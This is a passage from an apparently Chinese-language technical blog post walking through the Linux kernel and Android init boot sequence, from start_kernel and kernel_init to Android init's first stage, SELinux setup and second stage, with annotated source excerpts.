class=\"line\">\tadr_l\tx4, init_task</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tmov\tx0, x20</span><br><span class=\"line\">\tbl\tfinalise_el2\t\t\t// Prefer VHE if possible</span><br><span class=\"line\">\tldp\tx29, x30, [sp], #16</span><br><span class=\"line\">\tbl\tstart_kernel</span><br><span class=\"line\">\tASM_BUG()</span><br><span class=\"line\">SYM_FUNC_END(__primary_switched)</span><br></pre></td></tr></table></figure>\n<p>初始化会执行到__primary_switched,再执行start_kernel,start_kernel是内核C代码的入口<br>这个时候“0号”进程“swapper”(一个Idle进程)已经启动了(init_task.c中调用).</p>\n<ul>\n<li>启动内核<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 声明：inlude/linux/start_kernel.h</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> asmlinkage <span class=\"type\">void</span> __init __noreturn <span class=\"title function_\">start_kernel</span><span class=\"params\">(<span class=\"type\">void</span>)</span>;</span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">asmlinkage 是一个宏，用于指定函数的参数传递方式。它告诉编译器，函数的参数应从 堆栈 而不是 寄存器 中传递。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t作用：asmlinkage 在 Linux 内核中常用于定义一些系统调用函数，使得它们可以按照固定的方式接收参数，从而符合调用约定。通过 asmlinkage，内核可以在不同的体系架构上保持一致的参数传递方式，特别是在 x86 和其他架构中。</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">在 ARM64 中，asmlinkage 会影响函数调用的 ABI（应用程序二进制接口），通常用于系统调用和某些特殊的内核函数，以确保调用者在调用函数时符合规定的参数传递方式。*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//实现：init/main.c</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">start_kernel</span><span class=\"params\">(<span class=\"type\">void</span>)</span>&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tarch_call_rest_init();</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __init __weak __noreturn <span class=\"title function_\">arch_call_rest_init</span><span class=\"params\">(<span class=\"type\">void</span>)</span>&#123;</span><br><span class=\"line\">\trest_init();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">rest_init 函数的职责包括：</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\t1.\t启动 init 进程，使其获得 PID 1。</span></span><br><span class=\"line\"><span class=\"comment\">\t2.\t启动 kthreadd 内核线程管理进程，负责管理所有的内核线程。</span></span><br><span class=\"line\"><span class=\"comment\">\t3.\t将系统状态设置为 SYSTEM_SCHEDULING，表明系统已经完成启动并准备好调度。</span></span><br><span class=\"line\"><span class=\"comment\">\t4.\t最终将 CPU 置于空闲状态。</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">noinline <span class=\"type\">void</span> _ref __noreturn <span class=\"title function_\">rest_init</span><span class=\"params\">(<span class=\"type\">void</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> pid;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpid = user_mode_thread(kernel_init,<span class=\"literal\">NULL</span>,CLONE_FS);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">user_mode_thread 通过创建一个新的线程并切换到用户模式，完成了从内核空间向用户空间的过渡。这个过程需要配置和设置特定的寄存器、栈以及状态，以确保新线程可以在用户模式下正常运行。</span></span><br><span class=\"line\"><span class=\"comment\">1.\tinit 进程必须是用户态进程：</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t在 Linux 系统中，init 进程（PID 1）是第一个用户态进程。所有用户态进程都是直接或间接从 init 派生的。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tinit 进程通常负责启动用户空间的初始化脚本和守护进程，建立用户空间环境。因此，init 必须以用户态运行。</span></span><br><span class=\"line\"><span class=\"comment\">2.\tkernel_init 的任务是启动用户空间应用：</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tkernel_init 函数的作用是完成一些内核启动后的收尾工作，然后启动用户态的 /sbin/init 或者其他指定的初始化程序，以此开始加载用户态进程和服务。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t通过 user_mode_thread 进入用户模式执行 kernel_init，使得它可以顺利地过渡到用户空间，并启动用户态程序。\t</span></span><br><span class=\"line\"><span class=\"comment\">3.\t安全性和隔离性：</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t将 kernel_init 放在用户模式运行可以将其与内核空间隔离。这种设计符合 Linux 内核的安全模型，使用户空间和内核空间隔离，避免了对内核资源的意外或恶意操作。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t用户态进程的错误（如非法访问内存）不会影响到内核本身的稳定性，而是被限制在用户空间。</span></span><br><span class=\"line\"><span class=\"comment\">4.\t切换到用户态是 Linux 启动流程的必要步骤：</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tLinux 的启动流程分为内核初始化和用户空间初始化两个主要阶段。rest_init 调用 user_mode_thread 生成一个用户态进程，这标志着内核的初始化阶段已经完成，系统从内核态过渡到用户态。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t这一步完成后，内核将主要作为用户空间进程的支持系统，不会主动执行其他任务，除非通过系统调用、异常或中断进入内核。</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**kernel_init 函数的主要目标是执行用户空间的 init 程序（通常是 /sbin/init），从而让系统进入多用户操作模式，并为用户空间进程提供运行环境。*/</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __ref <span class=\"title function_\">kernel_init</span><span class=\"params\">(<span class=\"type\">void</span> *unused)</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * Wait until kthreadd is all set-up.</span></span><br><span class=\"line\"><span class=\"comment\">\t•\twait_for_completion 等待 kthreadd（内核线程管理进程）完成初始化，确保在内核线程管理机制准备好之前不会继续执行。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t这是启动用户空间进程的前提条件，因为用户态的进程可能需要创建内核线程，而 kthreadd 管理所有内核线程的创建。</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\twait_for_completion(&amp;kthreadd_done);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tkernel_init_freeable 负责完成一些可以在内核空间中释放的初始化任务。这些任务包括加载设备驱动程序、设置文件系统等。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t此时系统仍处于内核态，确保内核态初始化完整后再释放内存。</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tkernel_init_freeable();</span><br><span class=\"line\">\t<span class=\"comment\">/* need to finish all async __init code before freeing the memory </span></span><br><span class=\"line\"><span class=\"comment\">\t•\tasync_synchronize_full() 确保所有的异步初始化操作都已完成。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t设置 system_state 为 SYSTEM_FREEING_INITMEM，表明系统已经准备好释放初始化用的内存。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t调用一系列函数（如 kprobe_free_init_mem、ftrace_free_init_mem 等）释放内核初始化过程中分配的内存。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tfree_initmem() 释放 .init 段的内存，这部分内存仅用于启动时的内核态初始化，初始化完成后便不再需要，因此可以释放。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tmark_readonly() 将某些内核代码段设置为只读，以增强系统的安全性</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tasync_synchronize_full();</span><br><span class=\"line\"></span><br><span class=\"line\">\tsystem_state = SYSTEM_FREEING_INITMEM;</span><br><span class=\"line\">\tkprobe_free_init_mem();</span><br><span class=\"line\">\tftrace_free_init_mem();</span><br><span class=\"line\">\tkgdb_free_init_mem();</span><br><span class=\"line\">\texit_boot_config();</span><br><span class=\"line\">\tfree_initmem();</span><br><span class=\"line\">\tmark_readonly();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * Kernel mappings are now finalized - update the userspace page-table</span></span><br><span class=\"line\"><span class=\"comment\">\t * to finalize PTI.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\tpti_finalize();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t将系统状态设置为 SYSTEM_RUNNING，表示系统已经完成内核态的初始化，可以正常运行。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t设置默认的 NUMA（非一致性内存访问）策略。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t调用 rcu_end_inkernel_boot() 结束 RCU 的启动状态，进入正常的 RCU 调度状态。</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tsystem_state = SYSTEM_RUNNING;</span><br><span class=\"line\">\tnuma_default_policy();</span><br><span class=\"line\"></span><br><span class=\"line\">\trcu_end_inkernel_boot();</span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tdo_sysctl_args() 解析启动时传入的系统控制参数（sysctl arguments），并应用这些参数。</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tdo_sysctl_args();</span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t内核接下来会尝试启动 init 进程，进入用户空间，并完成从内核态到用户态的过渡。它会按顺序检查不同的命令，直到成功启动一个 init 程序。</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ramdisk_execute_command) &#123;</span><br><span class=\"line\">\t\tret = run_init_process(ramdisk_execute_command);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!ret)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tpr_err(<span class=\"string\">&quot;Failed to execute %s (error %d)\\n&quot;</span>,</span><br><span class=\"line\">\t\t       ramdisk_execute_command, ret);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * We try each of these until one succeeds.</span></span><br><span class=\"line\"><span class=\"comment\">\t *</span></span><br><span class=\"line\"><span class=\"comment\">\t * The Bourne shell can be used instead of init if we are</span></span><br><span class=\"line\"><span class=\"comment\">\t * trying to recover a really broken machine.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (execute_command) &#123;</span><br><span class=\"line\">\t\tret = run_init_process(execute_command);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!ret)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tpanic(<span class=\"string\">&quot;Requested init %s failed (error %d).&quot;</span>,</span><br><span class=\"line\">\t\t      execute_command, ret);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (CONFIG_DEFAULT_INIT[<span class=\"number\">0</span>] != <span class=\"string\">&#x27;\\0&#x27;</span>) &#123;</span><br><span class=\"line\">\t\tret = run_init_process(CONFIG_DEFAULT_INIT);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">\t\t\tpr_err(<span class=\"string\">&quot;Default init %s failed (error %d)\\n&quot;</span>,</span><br><span class=\"line\">\t\t\t       CONFIG_DEFAULT_INIT, ret);</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!try_to_run_init_process(<span class=\"string\">&quot;/sbin/init&quot;</span>) ||</span><br><span class=\"line\">\t    !try_to_run_init_process(<span class=\"string\">&quot;/etc/init&quot;</span>) ||</span><br><span class=\"line\">\t    !try_to_run_init_process(<span class=\"string\">&quot;/bin/init&quot;</span>) ||</span><br><span class=\"line\">\t    !try_to_run_init_process(<span class=\"string\">&quot;/bin/sh&quot;</span>))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpanic(<span class=\"string\">&quot;No working init found.  Try passing init= option to kernel. &quot;</span></span><br><span class=\"line\">\t      <span class=\"string\">&quot;See Linux Documentation/admin-guide/init.rst for guidance.&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">内核态到用户态的过渡</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"number\">1.</span>\t启动 init 进程：内核首先在内核态完成各项初始化工作，创建并执行 init 进程。</span><br><span class=\"line\">\t<span class=\"number\">2.</span>\t执行用户空间的 init 程序：init 程序成功启动后，系统将从内核态过渡到用户态。此时，init 成为用户空间中第一个进程，接管系统控制权。</span><br><span class=\"line\">\t<span class=\"number\">3.</span>\t进入用户空间：执行 execve（或类似的系统调用）将用户空间的 init 程序加载到内存中，内核清除旧的内存映射并建立用户空间的内存映射，完成从内核态到用户态的过渡。</span><br><span class=\"line\">\t<span class=\"number\">4.</span>\t系统进入正常运行：一旦 init 进程运行，系统便进入多用户模式，可以运行用户应用程序和守护进程。</span><br><span class=\"line\"></span><br><span class=\"line\">kernel_init:</span><br><span class=\"line\">\t•\tkernel_init 函数完成内核态的初始化任务并最终启动 init 进程。</span><br><span class=\"line\">\t•\t内核通过逐步释放内存、更新系统状态等操作，为进入用户态做好准备。</span><br><span class=\"line\">\t•\t当 init 程序启动成功，系统完成从内核态到用户态的过渡，内核初始化阶段结束，用户空间的系统管理程序正式接管控制权。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"init\"><a href=\"#init\" class=\"headerlink\" title=\"init\"></a>init</h2>源码：<code>system/core/init/main.cpp</code><br>进程位置：<code>/system/core/init</code></li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> __has_feature(address_sanitizer)</span></span><br><span class=\"line\">    __asan_set_error_report_callback(AsanReportCallback);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">strcmp</span>(<span class=\"built_in\">basename</span>(argv[<span class=\"number\">0</span>]), <span class=\"string\">&quot;ueventd&quot;</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">ueventd_main</span>(argc, argv);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">strcmp</span>(argv[<span class=\"number\">1</span>], <span class=\"string\">&quot;subcontext&quot;</span>)) &#123;</span><br><span class=\"line\">            android::base::<span class=\"built_in\">InitLogging</span>(argv, &amp;android::base::KernelLogger);</span><br><span class=\"line\">            <span class=\"type\">const</span> BuiltinFunctionMap function_map;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">SubcontextMain</span>(argc, argv, &amp;function_map);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">strcmp</span>(argv[<span class=\"number\">1</span>], <span class=\"string\">&quot;selinux_setup&quot;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">SetupSelinux</span>(argv);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">strcmp</span>(argv[<span class=\"number\">1</span>], <span class=\"string\">&quot;second_stage&quot;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">SecondStageMain</span>(argc, argv);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">FirstStageMain</span>(argc, argv);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>FirstStageMain</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">FirstStageMain</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\">\tstd::vector&lt;std::pair&lt;std::string, <span class=\"type\">int</span>&gt;&gt; errors;</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"keyword\">define</span> CHECKCALL(x) \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"keyword\">if</span> (x != 0) errors.emplace_back(#x <span class=\"string\">&quot; failed&quot;</span>, errno);</span></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t#x：# 是预处理操作符，将参数 x 转换为字符串字面量。例如，如果 x 是 open(&quot;/some/file&quot;)，那么 #x 会被替换为字符串 &quot;open(\\&quot;/some/file\\&quot;)&quot;。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t#x &quot; failed&quot;：会生成类似 &quot;open(\\&quot;/some/file\\&quot;) failed&quot; 的字符串，表示 x 的调用失败。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\terrno：一个全局变量，通常用来存储最近一次系统调用或库函数的错误代码。errno 的值在发生错误时会被相应函数设置成错误代码，以便诊断错误原因。</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">    <span class=\"built_in\">CHECKCALL</span>(<span class=\"built_in\">clearenv</span>());</span><br><span class=\"line\">    <span class=\"built_in\">CHECKCALL</span>(<span class=\"built_in\">setenv</span>(<span class=\"string\">&quot;PATH&quot;</span>, _PATH_DEFPATH, <span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"type\">char</span>* path = <span class=\"string\">&quot;/system/bin/init&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"type\">char</span>* args[] = &#123;path, <span class=\"string\">&quot;selinux_setup&quot;</span>, <span class=\"literal\">nullptr</span>&#125;;</span><br><span class=\"line\">    <span class=\"built_in\">execv</span>(path, <span class=\"built_in\">const_cast</span>&lt;<span class=\"type\">char</span>**&gt;(args));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行<code>/system/bin/init selinux_setup</code><br>SetupSelinux</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">SetupSelinux</span><span class=\"params\">(<span class=\"type\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">InitKernelLogging</span>(argv);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (REBOOT_BOOTLOADER_ON_PANIC) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">InstallRebootSignalHandlers</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Set up SELinux, loading the SELinux policy.</span></span><br><span class=\"line\">    <span class=\"built_in\">SelinuxSetupKernelLogging</span>();</span><br><span class=\"line\">    <span class=\"built_in\">SelinuxInitialize</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// We&#x27;re in the kernel domain and want to transition to the init domain.  File systems that</span></span><br><span class=\"line\">    <span class=\"comment\">// store SELabels in their xattrs, such as ext4 do not need an explicit restorecon here,</span></span><br><span class=\"line\">    <span class=\"comment\">// but other file systems do.  In particular, this is needed for ramdisks such as the</span></span><br><span class=\"line\">    <span class=\"comment\">// recovery image for A/B devices.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">selinux_android_restorecon</span>(<span class=\"string\">&quot;/system/bin/init&quot;</span>, <span class=\"number\">0</span>) == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">PLOG</span>(FATAL) &lt;&lt; <span class=\"string\">&quot;restorecon failed of /system/bin/init failed&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"type\">char</span>* path = <span class=\"string\">&quot;/system/bin/init&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"type\">char</span>* args[] = &#123;path, <span class=\"string\">&quot;second_stage&quot;</span>, <span class=\"literal\">nullptr</span>&#125;;</span><br><span class=\"line\">    <span class=\"built_in\">execv</span>(path, <span class=\"built_in\">const_cast</span>&lt;<span class=\"type\">char</span>**&gt;(args));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// execv() only returns if an error happened, in which case we</span></span><br><span class=\"line\">    <span class=\"comment\">// panic and never return from this function.</span></span><br><span class=\"line\">    <span class=\"built_in\">PLOG</span>(FATAL) &lt;&lt; <span class=\"string\">&quot;execv(\\&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class=\"string\">&quot;\\&quot;) failed&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行<code>/system/bin/init second_stage</code><br>SecondStageMain</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 